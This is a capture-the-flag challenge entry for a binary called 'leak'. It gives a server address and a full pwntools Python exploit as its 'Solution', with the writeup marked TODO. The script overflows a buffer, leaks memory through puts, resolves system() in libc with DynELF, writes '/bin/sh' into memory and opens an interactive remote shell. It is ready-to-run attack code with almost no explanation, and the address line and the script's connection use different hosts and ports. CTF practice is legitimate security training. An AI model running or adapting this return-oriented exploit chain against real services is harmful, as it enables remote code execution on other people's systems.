#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20001

#### Solution
```python
#!/usr/bin/env python

from pwn import *

# Io = process("./leak")
Io = remote("pwn.sniperoj.cn", 30007)

Io.readuntil("Right?\n")

def leak_one_byte(addr):
    junk = "A" * 28
    puts_plt = p32(0x08048350)
    addr = p32(addr)
    _start_addr = p32(0x08048390)
    payload = junk + puts_plt + _start_addr + addr
    Io.sendline(payload)
    leak_data = Io.read().replace("\nWelcome to Sniperoj!\nDancing in shackles, Right?\n", "")
    if len(leak_data) == 0:
        return "\x00"
    else:
        return leak_data[0]

def leak(addr):
    leak_data = ''
    leak_data += leak_one_byte(addr + 0)
    leak_data += leak_one_byte(addr + 1)
    leak_data += leak_one_byte(addr + 2)
    leak_data += leak_one_byte(addr + 3)
    print "[+] [%08x] -> [%s] = [%s]" % (addr, leak_data, repr(leak_data))
    return leak_data

def main():
    # test leak function
    # leak(0x08048634 + 4)

    # leak the address of system()
    d = DynELF(leak, elf=ELF("./leak"))
    system_addr = d.lookup('system', 'libc')
    print "[system()] -> [%s]" % (hex(system_addr))

    # read /bin/sh to memory
    junk = "A" * 28
    read_plt = p32(0x08048340)
    fd = p32(0) # stdin
    _data = p32(0x0804A01C) # some where can write
    length = p32(len("/bin/sh\n"))
    pop_pop_pop_ret_addr = p32(0x080485d9) # make stack fine

    payload = junk + read_plt + pop_pop_pop_ret_addr + fd + _data + length + p32(system_addr) + "\x00" * 4 + _data

    # payload
    Io.sendline(payload)

    # send /bin/sh
    Io.sendline("/bin/sh\x00")

    # interactive
    Io.interactive()


if __name__ == "__main__":
    main()
```

#### Writeups
 * TODO

